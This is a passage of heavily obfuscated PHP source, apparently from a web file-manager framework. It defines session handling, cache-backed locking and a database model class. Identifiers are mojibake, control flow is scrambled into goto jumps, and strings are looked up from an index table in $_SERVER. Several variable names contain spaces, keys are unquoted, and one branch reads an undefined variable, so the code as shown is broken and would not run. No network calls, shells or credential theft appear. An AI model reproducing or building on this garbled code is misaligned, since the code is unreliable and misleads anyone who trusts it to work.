$_SERVER[$d∑÷ÿá®¡÷[151]]; goto fÂ¿Úóïåñ; D≠„ê©à¥Æ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Få¶ß¢ÕÔ≠; Få¶ß¢ÕÔ≠: $EÑ’ﬁ√ÊÙä =& $_SERVER[£¿ÌÙëü¡¯¯]; static $DÜπ’æ«§À = false; if ($DÜπ’æ«§À) { return $DÜπ’æ«§À; } goto B“úçã…õï; b‡Ë≤ÉÎóÛ: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $eâ∂ƒ√Ï¨≤ = $eã—Óªó∏©[$EÑ’ﬁ√ÊÙä[1312]]; $B´ÖÃã≈é’ = $eã—Óªó∏©[$eâ∂ƒ√Ï¨≤]; goto c÷ÔÙÑ»ëﬁ; c÷ÔÙÑ»ëﬁ: $FÌ“á ®‚® = $eã—Óªó∏©[$EÑ’ﬁ√ÊÙä[751]]; switch ($eâ∂ƒ√Ï¨≤) { case $EÑ’ﬁ√ÊÙä[17]: self::$handle = Model($EÑ’ﬁ√ÊÙä[752]); break; case $EÑ’ﬁ√ÊÙä[753]: self::$handle = new CacheRedis($B´ÖÃã≈é’, $FÌ“á ®‚®); break; case $EÑ’ﬁ√ÊÙä[754]: self::$handle = new CacheMemcached($B´ÖÃã≈é’, $FÌ“á ®‚®); break; case $EÑ’ﬁ√ÊÙä[164]: $B´ÖÃã≈é’[$EÑ’ﬁ√ÊÙä[76]] = $B´ÖÃã≈é’[$EÑ’ﬁ√ÊÙä[76]] . $EÑ’ﬁ√ÊÙä[1313]; self::$handle = new CacheFile($B´ÖÃã≈é’, $FÌ“á ®‚®); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto EîÜ’–å•°; EîÜ’–å•°: $DÜπ’æ«§À = new self(); return $DÜπ’æ«§À; goto aØ‹”Û·°á; B“úçã…õï: $eã—Óªó∏© = $GLOBALS[$EÑ’ﬁ√ÊÙä[6]][$EÑ’ﬁ√ÊÙä[334]]; self::$sessionTime = $eã—Óªó∏©[$EÑ’ﬁ√ÊÙä[1311]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto b‡Ë≤ÉÎóÛ; aØ‹”Û·°á: } public static function sign($C⁄ÉªÌË»Æ = false) { $C⁄ÉªÌË»Æ && (self::$sessionSign = $C⁄ÉªÌË»Æ); self::init(); return self::$sessionSign; } public static function set($c≥äêâÉÈº, $D…Í‘¿›Ó‘ = false) { self::init(); if (is_array($c≥äêâÉÈº)) { foreach ($c≥äêâÉÈº as $b˜Â‹∆∞π¨ => $fáﬂòﬂ∞ä∆) { array_set_value(self::$data, $b˜Â‹∆∞π¨, $fáﬂòﬂ∞ä∆); } } else { array_set_value(self::$data, $c≥äêâÉÈº, $D…Í‘¿›Ó‘); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fÎÒØÖ ÊÈ = false) { self::init(); if (!$fÎÒØÖ ÊÈ) { return self::$data; } return array_get_value(self::$data, $fÎÒØÖ ÊÈ); } public static function remove($Eòñﬂ√éŸµ) { self::init(); unset(self::$data[$Eòñﬂ√éŸµ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[£¿ÌÙëü¡¯¯][756])) { self::$handle->clearTimeout(); } } } goto Fù£◊ñç‹Œ; Câ®«”∆¡Ï: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DåŸñ¡ù©‹; DåŸñ¡ù©‹: $a„≤ãö¥ºÃ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (self::$handle) { return self::$handle; } $E‹ããäË®µ = $GLOBALS[$a„≤ãö¥ºÃ[6]][$a„≤ãö¥ºÃ[334]]; goto Dùº™Ö⁄É˜; Dùº™Ö⁄É˜: self::$timeout = $E‹ããäË®µ[$a„≤ãö¥ºÃ[762]] ? $E‹ããäË®µ[$a„≤ãö¥ºÃ[762]] : 10; $FâΩ®é©€í = _get($GLOBALS[$a„≤ãö¥ºÃ[6]], $a„≤ãö¥ºÃ[763]); if ($E‹ããäË®µ[$a„≤ãö¥ºÃ[750]] == $a„≤ãö¥ºÃ[17] && $FâΩ®é©€í == $a„≤ãö¥ºÃ[9]) { $E‹ããäË®µ[$a„≤ãö¥ºÃ[750]] = $a„≤ãö¥ºÃ[164]; } goto A‘¢◊Ôïå◊; A‘¢◊Ôïå◊: switch ($E‹ããäË®µ[$a„≤ãö¥ºÃ[750]]) { case $a„≤ãö¥ºÃ[753]: self::$handle = new CacheLockRedis(); break; case $a„≤ãö¥ºÃ[754]: self::$handle = new CacheLockMemcached(); break; case $a„≤ãö¥ºÃ[17]: self::$handle = new CacheLockDatabase(); break; case $a„≤ãö¥ºÃ[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C–È€ôâ«œ; C–È€ôâ«œ: } private static function key($e£ﬁ±–Â÷‘) { return $_SERVER[£¿ÌÙëü¡¯¯][764] . Cache::key($e£ﬁ±–Â÷‘); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($C˘óô∂»å◊ = '') { self::$errorMsg = $C˘óô∂»å◊; } public static function lockGlobal($aë‡ﬂ∂„ƒè, $BƒÍãí˘êË) { return self::lock($aë‡ﬂ∂„ƒè, $BƒÍãí˘êË, !0); } public static function lock($E®ü•ãıÑ, $c∆™€“ùè∏ = false, $dæÃâÌ±ÚÜ = false) { goto e‡”ë“åù˘; eˆáÇ∑¶ôà: if (!$dæÃâÌ±ÚÜ) { self::$lockItem[$f„ﬁÂá”Ùç] = !0; } return $EØé¥Ç⁄Ω; goto d˘Õóœ§⁄…; e‡”ë“åù˘: $D›øú¯é’Ã =& $_SERVER[£¿ÌÙëü¡¯¯]; $b‚óÕÿì≥Í = self::init(); $f„ﬁÂá”Ùç = self::key($E®ü•ãıÑ); goto Eóù£ä±¢; Eóù£ä±¢: $c∆™€“ùè∏ = $c∆™€“ùè∏ ? $c∆™€“ùè∏ : self::$timeout; $EØé¥Ç⁄Ω = $b‚óÕÿì≥Í->lock($f„ﬁÂá”Ùç, $c∆™€“ùè∏); if (!$EØé¥Ç⁄Ω) { $Fã±∂îò˘Œ = $D›øú¯é’Ã[765] . $c∆™€“ùè∏ . $D›øú¯é’Ã[68] . self::$errorMsg . $D›øú¯é’Ã[68] . get_caller_msg(); $aÃÈâÿæÍå = "\x4c\x6f\x63\x6b\x20\x61\143\x74\x69\157\156\x3a\40{$f„ﬁÂá”Ùç}\x20\x74\151\x6d\145\x6f\x75\164\x2c\157\166\145\162\40{$c∆™€“ùè∏}\40\163"; $aÃÈâÿæÍå = self::$errorMsg ? self::$errorMsg : $BÂÓùÑê¢∂; write_log($Fã±∂îò˘Œ, $D›øú¯é’Ã[766]); show_json($aÃÈâÿæÍå, !1); } goto eˆáÇ∑¶ôà; d˘Õóœ§⁄…: } public static function lockGet($B…ØÏÁÿÂ©) { $Aƒ¶É…÷©è = self::key($B…ØÏÁÿÂ©); if (self::$lockItem[$Aƒ¶É…÷©è]) { return self::$lockItem[$Aƒ¶É…÷©è]; } return self::init()->lockGet($Aƒ¶É…÷©è); } public static function unlock($cƒ∞ç ÿ”€) { $dÓûÏˆØ¡¨ = self::key($cƒ∞ç ÿ”€); self::$lockItem[$dÓûÏˆØ¡¨] = null; return self::init()->unlock($dÓûÏˆØ¡¨); } public static function unlockRuntime() { $DÒÍŸËˆ∑æ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fˆ≈Ωâ◊Ë„ = self::init(); $dî∑ÂÃÑÈ¯ = !1; foreach (self::$lockItem as $eÃéΩÚ≈´‚ => $b¥æÔ¯≈ú¡) { if (!$b¥æÔ¯≈ú¡) { continue; } $Fˆ≈Ωâ◊Ë„->unlock($eÃéΩÚ≈´‚); if (!$dî∑ÂÃÑÈ¯) { $dî∑ÂÃÑÈ¯ = !0; write_log($DÒÍŸËˆ∑æ[767] . $eÃéΩÚ≈´‚ . $DÒÍŸËˆ∑æ[68] . get_caller_msg(), $DÒÍŸËˆ∑æ[766]); continue; } write_log($DÒÍŸËˆ∑æ[767] . $eÃéΩÚ≈´‚, $DÒÍŸËˆ∑æ[766]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $câπ›π“Ô‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dà´±ÍÙø† = $GLOBALS[$câπ›π“Ô‘[6]][$câπ›π“Ô‘[334]]; self::$cachePath = $dà´±ÍÙø†[$câπ›π“Ô‘[164]][$câπ›π“Ô‘[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Cò¬êÁΩÆê, $c≤âÒåÌ = 0) { goto Dö›¨äêËè; e¬°ºﬁ«ôê: $this->unlock($Cò¬êÁΩÆê); return !1; goto cö¢Ö¯†ã∫; Dö›¨äêËè: $aÆÑ´â≠Í€ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dµõﬂ¿Üâ∞ = microtime(!0); $DÈ∂Éøéßª = $dµõﬂ¿Üâ∞ + $c≤âÒåÌ + 0.0001; goto eÎê÷åÀà°; eÎê÷åÀà°: $f‘ÛÚÏËùã = rtrim(self::$cachePath, $aÆÑ´â≠Í€[8]) . $aÆÑ´â≠Í€[768] . md5($Cò¬êÁΩÆê) . $aÆÑ´â≠Í€[769]; if (file_exists($f‘ÛÚÏËùã) && filemtime($f‘ÛÚÏËùã) && filemtime($f‘ÛÚÏËùã) < time() - 10) { @unlink($f‘ÛÚÏËùã); } do { if (file_exists($f‘ÛÚÏËùã)) { cacheLockWait(); continue; } $f©–∞±ÁÎﬂ = fopen($f‘ÛÚÏËùã, $aÆÑ´â≠Í€[770]); if (!$f©–∞±ÁÎﬂ) { return !1; } $A≥€ç„ëÇÌ = flock($f©–∞±ÁÎﬂ, LOCK_EX | LOCK_NB); self::$caches[$Cò¬êÁΩÆê] = array($aÆÑ´â≠Í€[771] => $f©–∞±ÁÎﬂ, $aÆÑ´â≠Í€[164] => $f‘ÛÚÏËùã); fwrite($f©–∞±ÁÎﬂ, $DÈ∂Éøéßª); clearstatcache(); if ($f©–∞±ÁÎﬂ && $A≥€ç„ëÇÌ) { return !0; } cacheLockWait(); } while (microtime(!0) < $DÈ∂Éøéßª); goto e¬°ºﬁ«ôê; cö¢Ö¯†ã∫: } public function lockGet($Aè—‚¡†èÛ) { $dﬁ∏§ñ“Ü˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E˘£ê≈ôÑË = rtrim(self::$cachePath, $dﬁ∏§ñ“Ü˜[8]) . $dﬁ∏§ñ“Ü˜[768] . md5($Aè—‚¡†èÛ) . $dﬁ∏§ñ“Ü˜[769]; return file_exists($E˘£ê≈ôÑË); } public function unlock($C°˘àÜÑ≥€) { goto Bœ∂¢Ì‚Â˘; aù÷Î’ﬂÂÇ: @flock($fõêı¶πóä[$aÆ∏é©÷Á¢[771]], LOCK_UN); @fclose($fõêı¶πóä[$aÆ∏é©÷Á¢[771]]); @unlink($fõêı¶πóä[$aÆ∏é©÷Á¢[164]]); goto FΩî™ßé∞¬; FΩî™ßé∞¬: unset(self::$caches[$C°˘àÜÑ≥€]); goto AÖ…⁄ìé∫ä; Bœ∂¢Ì‚Â˘: $aÆ∏é©÷Á¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fõêı¶πóä = self::$caches[$C°˘àÜÑ≥€]; if (!$fõêı¶πóä) { return; } goto aù÷Î’ﬂÂÇ; AÖ…⁄ìé∫ä: } } goto c´ßú˜Óä¬; Dı«§Ω§Çã: define($_SERVER[£¿ÌÙëü¡¯¯][227], 0); define($_SERVER[£¿ÌÙëü¡¯¯][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\162\x64\145\162", "\x61\x6c\151\141\163", "\x68\x61\x76\x69\156\147", "\147\x72\157\x75\160", "\154\157\x63\x6b", "\x64\151\163\x74\x69\156\143\x74", "\141\165\x74\x6f", "\x66\151\154\164\145\162", "\166\141\x6c\151\144\x61\164\145", "\x72\x65\x73\165\x6c\x74", "\x62\x69\x6e\144", "\164\x6f\x6b\145\156"); public function __construct($cøÛ¨ìﬂÌ° = '', $F’⁄›’Ùπß = '', $E”˘Öà”˜ñ = '') { $DÉÌ‹Ìñºö =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->_initialize(); if (!empty($cøÛ¨ìﬂÌ°)) { if (strpos($cøÛ¨ìﬂÌ°, $DÉÌ‹Ìñºö[94])) { list($this->dbName, $this->name) = explode($DÉÌ‹Ìñºö[94], $cøÛ¨ìﬂÌ°); } else { $this->name = $cøÛ¨ìﬂÌ°; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F’⁄›’Ùπß)) { $this->tablePrefix = $DÉÌ‹Ìñºö[33]; } elseif ($DÉÌ‹Ìñºö[33] != $F’⁄›’Ùπß) { $this->tablePrefix = $F’⁄›’Ùπß; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($DÉÌ‹Ìñºö[229]); } $this->db(0, empty($this->connection) ? $E”˘Öà”˜ñ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $aêŸúœò¨é =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($this->fields)) { if (think_config($aêŸúœò¨é[230])) { $bµç™èÉÈ∫ = $this->dbName ? $this->dbName : think_config($aêŸúœò¨é[231]); $A—ø‡µ∞êÌ = think_var_cache($aêŸúœò¨é[232] . strtolower(get_path_this($bµç™èÉÈ∫) . $aêŸúœò¨é[94] . $this->name)); if ($A—ø‡µ∞êÌ) { $fÇ´È”¬§À = think_config($aêŸúœò¨é[233]); if (empty($fÇ´È”¬§À) || $A—ø‡µ∞êÌ[$aêŸúœò¨é[234]] == $fÇ´È”¬§À) { $this->fields = $A—ø‡µ∞êÌ; return; } } } $this->flush(); } } public function flush() { goto b®ÍÊãÕÆ·; Aœÿ–œÜŸı: foreach ($b∫’ƒæû»° as $eì£”úÇéÔ => $cÉéı∆·›ß) { $Aœ§Û›‚µ∫[$eì£”úÇéÔ] = $cÉéı∆·›ß[$cñùåÜÿêè[29]]; if ($cÉéı∆·›ß[$cñùåÜÿêè[36]]) { $this->fields[$cñùåÜÿêè[236]] = $eì£”úÇéÔ; if ($cÉéı∆·›ß[$cñùåÜÿêè[39]]) { $this->fields[$cñùåÜÿêè[235]] = !0; } } } $this->fields[$cñùåÜÿêè[237]] = $Aœ§Û›‚µ∫; if (think_config($cñùåÜÿêè[233])) { $this->fields[$cñùåÜÿêè[234]] = think_config($cñùåÜÿêè[233]); } goto Bëáõ§ßΩÌ; Eø¢÷ñçﬂ’: if (!$b∫’ƒæû»°) { return !1; } $this->fields = array_keys($b∫’ƒæû»°); $this->fields[$cñùåÜÿêè[235]] = !1; goto Aœÿ–œÜŸı; b®ÍÊãÕÆ·: $cñùåÜÿêè =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->db->setModel($this->name); $b∫’ƒæû»° = $this->db->getFields($this->getTableName()); goto Eø¢÷ñçﬂ’; Bëáõ§ßΩÌ: if (think_config($cñùåÜÿêè[230])) { $d£äÃ◊◊Ú≥ = $this->dbName ? $this->dbName : think_config($cñùåÜÿêè[231]); think_var_cache($cñùåÜÿêè[232] . strtolower(get_path_this($d£äÃ◊◊Ú≥) . $cñùåÜÿêè[94] . $this->name), $this->fields); } goto B¢§íöçî≈; B¢§íöçî≈: } public function switchModel($Eëàé‰¯Ô®, $EùäÎ…–†— = array()) { $dÓÎÀßïëö =& $_SERVER[£¿ÌÙëü¡¯¯]; $f¶”∏ß†º¢ = ucwords(strtolower($Eëàé‰¯Ô®)) . $dÓÎÀßïëö[238]; if (!class_exists($f¶”∏ß†º¢)) { think_exception($f¶”∏ß†º¢ . think_lang($dÓÎÀßïëö[239])); } $this->_extModel = new $f¶”∏ß†º¢($this->name); if (!empty($EùäÎ…–†—)) { foreach ($EùäÎ…–†— as $EÁ±âÃÛ…∞) { $this->_extModel->setProperty($EÁ±âÃÛ…∞, $this->{$EÁ±âÃÛ…∞}); } } return $this->_extModel; } public function __set($f∂ëã¶ëöé, $DéËπáŸ§) { $this->data[$f∂ëã¶ëöé] = $DéËπáŸ§; } public function __get($C‹ªà‘¥˘ê) { return isset($this->data[$C‹ªà‘¥˘ê]) ? $this->data[$C‹ªà‘¥˘ê] : null; } public function __isset($FØÏ–€£ƒÌ) { return isset($this->data[$FØÏ–€£ƒÌ]); } public function __unset($D»°®µª˘è) { unset($this->data[$D»°®µª˘è]); } public function __call($fÈº§§ûüÒ, $E“Ωù£ ¶ı) { $f≤ùèõêû =& $_SERVER[£¿ÌÙëü¡¯¯]; if (in_array(strtolower($fÈº§§ûüÒ), $this->methods, !0)) { $this->options[strtolower($fÈº§§ûüÒ)] = $E“Ωù£ ¶ı[0]; return $this; } elseif (in_array(strtolower($fÈº§§ûüÒ), array($f≤ùèõêû[240], $f≤ùèõêû[241], $f≤ùèõêû[242], $f≤ùèõêû[243], $f≤ùèõêû[244]), !0)) { $FŒÏ÷â…√ = isset($E“Ωù£ ¶ı[0]) ? $E“Ωù£ ¶ı[0] : $f≤ùèõêû[173]; $FŒÏ÷â…√ = $this->db->parseKey($FŒÏ÷â…√); return $this->getField(strtoupper($fÈº§§ûüÒ) . $f≤ùèõêû[245] . $FŒÏ÷â…√ . $f≤ùèõêû[246] . $fÈº§§ûüÒ, $f≤ùèõêû[240]); } elseif (strtolower(substr($fÈº§§ûüÒ, 0, 5)) == $f≤ùèõêû[247]) { $FŒÏ÷â…√ = think_parse_name(substr($fÈº§§ûüÒ, 5)); $dΩÜâ≈≤≤£[$FŒÏ÷â…√] = $E“Ωù£ ¶ı[0]; return $this->where($dΩÜâ≈≤≤£)->find(); } elseif (strtolower(substr($fÈº§§ûüÒ, 0, 10)) == $f≤ùèõêû[248]) { $Aıã∞˜™√ß = think_parse_name(substr($fÈº§§ûüÒ, 10)); $dΩÜâ≈≤≤£[$Aıã∞˜™√ß] = $E“Ωù£ ¶ı[0]; return $this->where($dΩÜâ≈≤≤£)->getField($E“Ωù£ ¶ı[1]); } elseif (isset($this->_scope[$fÈº§§ûüÒ])) { return $this->scope($fÈº§§ûüÒ, $E“Ωù£ ¶ı[0]); } elseif (method_exists($this, $fÈº§§ûüÒ)) { array_unshift($E“Ωù£ ¶ı, $fÈº§§ûüÒ); return call_user_func_array(array($this, $f≤ùèõêû[249]), $E“Ωù£ ¶ı); } else { return call_user_func_array(array(parent, $fÈº§§ûüÒ), $E“Ωù£ ¶ı); } } protected function call() { goto D“â¢Û•ê⁄; aÈêÿ¨ƒå™: $Dâ≥îá≥€• = $D√Û≠ÏÎ‡å; if (is_array($D√Û≠ÏÎ‡å)) { $Dâ≥îá≥€• = $D√Û≠ÏÎ‡å[1]; $D√Û≠ÏÎ‡å = $D√Û≠ÏÎ‡å[0]; } $e‡ƒÖ†À≈⁄ = count($C≈ÆÀ·Ã®â) - 1; goto B√≤†§è∞õ; D¢«⁄õññΩ: $F¥ÌŒ¬π·° = call_user_func_array(array($this, $D√Û≠ÏÎ‡å), $C≈ÆÀ·Ã®â); if (method_exists($this, $e∏°µÜ‡Üä[253])) { $DØ·”√Öô˘ = call_user_func_array(array($this, $e∏°µÜ‡Üä[254]), array($Dâ≥îá≥€•, $C≈ÆÀ·Ã®â, $F¥ÌŒ¬π·°)); if ($DØ·”√Öô˘) { return $DØ·”√Öô˘; } } return $F¥ÌŒ¬π·°; goto cÑ∞÷ô∆öÙ; D“â¢Û•ê⁄: $e∏°µÜ‡Üä =& $_SERVER[£¿ÌÙëü¡¯¯]; $C≈ÆÀ·Ã®â = func_get_args(); $D√Û≠ÏÎ‡å = array_shift($C≈ÆÀ·Ã®â); goto aÈêÿ¨ƒå™; B√≤†§è∞õ: if (isset($C≈ÆÀ·Ã®â[$e‡ƒÖ†À≈⁄]) && $C≈ÆÀ·Ã®â[$e‡ƒÖ†À≈⁄] === $D√Û≠ÏÎ‡å) { think_exception(__CLASS__ . $e∏°µÜ‡Üä[4] . $D√Û≠ÏÎ‡å . think_lang($e∏°µÜ‡Üä[250])); return; } $C≈ÆÀ·Ã®â[] = $D√Û≠ÏÎ‡å; if (method_exists($this, $e∏°µÜ‡Üä[251])) { $DØ·”√Öô˘ = call_user_func_array(array($this, $e∏°µÜ‡Üä[252]), array($Dâ≥îá≥€•, $C≈ÆÀ·Ã®â)); if (!is_null($DØ·”√Öô˘) && $DØ·”√Öô˘ !== !1) { return $DØ·”√Öô˘; } } goto D¢«⁄õññΩ; cÑ∞÷ô∆öÙ: } protected function _initialize() { } protected function _facade($aììãã§—ã) { $aÁÔÏâüƒ∫ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($this->fields)) { foreach ($aììãã§—ã as $BçÌàÉé≠√ => $AÂŸ∆øí§É) { if (!in_array($BçÌàÉé≠√, $this->fields, !0)) { unset($aììãã§—ã[$BçÌàÉé≠√]); } elseif (is_scalar($AÂŸ∆øí§É)) { $this->_parseType($aììãã§—ã, $BçÌàÉé≠√); } } } if (!empty($this->options[$aÁÔÏâüƒ∫[255]])) { $aììãã§—ã = array_map($this->options[$aÁÔÏâüƒ∫[255]], $aììãã§—ã); unset($this->options[$aÁÔÏâüƒ∫[255]]); } $this->_beforeWrite($aììãã§—ã); return $aììãã§—ã; } protected function _beforeWrite(&$b∫ºç‹„å⁄) { } public function add($fôœ¢Ó´·æ = '', $aÆ„∫€∆¿è = array(), $dπù∂µ¡ﬂ‰ = false) { goto B˘´ı¡î”√; Díúèáå·ˆ: if (!1 === $this->_beforeInsert($fôœ¢Ó´·æ, $aÆ„∫€∆¿è)) { return !1; } $eÊÇñáÍíç = $this->db->insert($fôœ¢Ó´·æ, $aÆ„∫€∆¿è, $dπù∂µ¡ﬂ‰); if (!1 !== $eÊÇñáÍíç) { $Dèãö∏à» = $this->getLastInsID(); if ($Dèãö∏à») { $fôœ¢Ó´·æ[$this->getPk()] = $Dèãö∏à»; $this->_after_insert($fôœ¢Ó´·æ, $aÆ„∫€∆¿è); return $Dèãö∏à»; } $this->_after_insert($fôœ¢Ó´·æ, $aÆ„∫€∆¿è); } goto a≤∂Èîã™; a≤∂Èîã™: return $eÊÇñáÍíç; goto DéﬂŸ⁄óƒ”; B˘´ı¡î”√: if (empty($fôœ¢Ó´·æ)) { if (!empty($this->data)) { $fôœ¢Ó´·æ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[£¿ÌÙëü¡¯¯][256]); return !1; } } $aÆ„∫€∆¿è = $this->_parseOptions($aÆ„∫€∆¿è); $fôœ¢Ó´·æ = $this->_facade($fôœ¢Ó´·æ); goto Díúèáå·ˆ; DéﬂŸ⁄óƒ”: } protected function _beforeInsert(&$dï≠ÏÖØŸ„, $eçŸÇ≥ÈÖß) { } protected function _after_insert($e¥ï£•Éﬁë, $f«°•ÙÌ€è) { } public function addAll($FöË»ΩÊ±Ö, $c®ì«ÊÜÓπ = array(), $c¢∑åâç‹÷ = false) { goto aœ“Í…í®å; bÓê”÷§˘î: foreach ($FöË»ΩÊ±Ö as $b‡ØìÖ›πö => $C–Á°£Î™ñ) { $FöË»ΩÊ±Ö[$b‡ØìÖ›πö] = $this->_facade($C–Á°£Î™ñ); } if (method_exists($this->db, $C∫ıùÓ¿ÌÎ[257])) { $D„ÍéÑÖÑ∏ = $this->db->insertAll($FöË»ΩÊ±Ö, $c®ì«ÊÜÓπ, $c¢∑åâç‹÷); } else { $this->startTrans(); foreach ($FöË»ΩÊ±Ö as $b‡ØìÖ›πö => $C–Á°£Î™ñ) { $D„ÍéÑÖÑ∏ = $this->db->insert($C–Á°£Î™ñ, $c®ì«ÊÜÓπ, $c¢∑åâç‹÷); } $this->commit(); } if (!1 !== $D„ÍéÑÖÑ∏) { $D˘¬ËÑÈ¢Ô = $this->getLastInsID(); if ($D˘¬ËÑÈ¢Ô) { return $D˘¬ËÑÈ¢Ô; } } goto a”ù†úºÉµ; aœ“Í…í®å: $C∫ıùÓ¿ÌÎ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($FöË»ΩÊ±Ö)) { $this->error = think_lang($C∫ıùÓ¿ÌÎ[256]); return !1; } $c®ì«ÊÜÓπ = $this->_parseOptions($c®ì«ÊÜÓπ); goto bÓê”÷§˘î; a”ù†úºÉµ: return $D„ÍéÑÖÑ∏; goto c≈´ëû∆Öç; c≈´ëû∆Öç: } public function selectAdd($eÕí‹°òÎ„ = '', $D¯â ıı‰≥ = '', $B•Ì˘…ÙΩ° = array()) { $A©Œ¨åáÔÀ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B•Ì˘…ÙΩ° = $this->_parseOptions($B•Ì˘…ÙΩ°); if (!1 === ($bÕ¯’ó€Ê∑ = $this->db->selectInsert($eÕí‹°òÎ„ ? $eÕí‹°òÎ„ : $B•Ì˘…ÙΩ°[$A©Œ¨åáÔÀ[258]], $D¯â ıı‰≥ ? $D¯â ıı‰≥ : $this->getTableName(), $B•Ì˘…ÙΩ°))) { $this->error = think_lang($A©Œ¨åáÔÀ[259]); return !1; } else { return $bÕ¯’ó€Ê∑; } } public function save($bÛÉìæ≥ÕÈ = '', $añ™ÆÜÈûâ = array()) { goto cÀÎÙºûç≥; f¨Û®óóá: if (is_array($añ™ÆÜÈûâ[$fÑ¢ÊÑåî¨[260]]) && isset($añ™ÆÜÈûâ[$fÑ¢ÊÑåî¨[260]][$BÑøäÎÖΩÀ])) { $eÊÏù¬ÊÒØ = $añ™ÆÜÈûâ[$fÑ¢ÊÑåî¨[260]][$BÑøäÎÖΩÀ]; } if (!1 === $this->_beforeUpdate($bÛÉìæ≥ÕÈ, $añ™ÆÜÈûâ)) { return !1; } $CﬂãâÖ∫≈Ã = $this->db->update($bÛÉìæ≥ÕÈ, $añ™ÆÜÈûâ); goto eÚÃç¡óõØ; cÀÎÙºûç≥: $fÑ¢ÊÑåî¨ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($bÛÉìæ≥ÕÈ)) { if (!empty($this->data)) { $bÛÉìæ≥ÕÈ = $this->data; $this->data = array(); } else { $this->error = think_lang($fÑ¢ÊÑåî¨[256]); return !1; } } $bÛÉìæ≥ÕÈ = $this->_facade($bÛÉìæ≥ÕÈ); goto dõ·ÁÜë¥Ê; dõ·ÁÜë¥Ê: $añ™ÆÜÈûâ = $this->_parseOptions($añ™ÆÜÈûâ); $BÑøäÎÖΩÀ = $this->getPk(); if (!isset($añ™ÆÜÈûâ[$fÑ¢ÊÑåî¨[260]])) { if (isset($bÛÉìæ≥ÕÈ[$BÑøäÎÖΩÀ])) { $Dô”¢ôÑµç[$BÑøäÎÖΩÀ] = $bÛÉìæ≥ÕÈ[$BÑøäÎÖΩÀ]; $añ™ÆÜÈûâ[$fÑ¢ÊÑåî¨[260]] = $Dô”¢ôÑµç; unset($bÛÉìæ≥ÕÈ[$BÑøäÎÖΩÀ]); } else { $this->error = think_lang($fÑ¢ÊÑåî¨[259]); return !1; } } goto f¨Û®óóá; eÚÃç¡óõØ: if (!1 !== $CﬂãâÖ∫≈Ã) { if (isset($eÊÏù¬ÊÒØ)) { $bÛÉìæ≥ÕÈ[$BÑøäÎÖΩÀ] = $eÊÏù¬ÊÒØ; } $this->_afterUpdate($bÛÉìæ≥ÕÈ, $añ™ÆÜÈûâ); } return $CﬂãâÖ∫≈Ã; goto dÊŸ»∂†ÿË; dÊŸ»∂†ÿË: } protected function _beforeUpdate(&$D‹ê≠ìÖÉì, $b…¡®˜•§∑) { } protected function _afterUpdate($Fä»êÇªáÿ, $dÚ–≤Çë‡À) { } public function delete($Cî≤–ä˘∫å = array()) { goto Aâ›ßı÷µÈ; B˘úÑØÈΩ®: if (is_numeric($Cî≤–ä˘∫å) || is_string($Cî≤–ä˘∫å)) { if (strpos($Cî≤–ä˘∫å, $f¶ü±¶‰’ù[47])) { $DˆÜ’¥ƒËß[$DÛ‰‹Ÿ¨•¥] = array($f¶ü±¶‰’ù[261], $Cî≤–ä˘∫å); } else { $DˆÜ’¥ƒËß[$DÛ‰‹Ÿ¨•¥] = $Cî≤–ä˘∫å; } $this->options[$f¶ü±¶‰’ù[260]] = $DˆÜ’¥ƒËß; } $Cî≤–ä˘∫å = $this->_parseOptions(); if (is_array($Cî≤–ä˘∫å[$f¶ü±¶‰’ù[260]]) && isset($Cî≤–ä˘∫å[$f¶ü±¶‰’ù[260]][$DÛ‰‹Ÿ¨•¥])) { $Dƒ£⁄Ó”Ü∏ = $Cî≤–ä˘∫å[$f¶ü±¶‰’ù[260]][$DÛ‰‹Ÿ¨•¥]; } goto Eë¡ €◊Ô´; Eë¡ €◊Ô´: $cëó ¨…éÕ = $this->db->delete($Cî≤–ä˘∫å); if (!1 !== $cëó ¨…éÕ) { 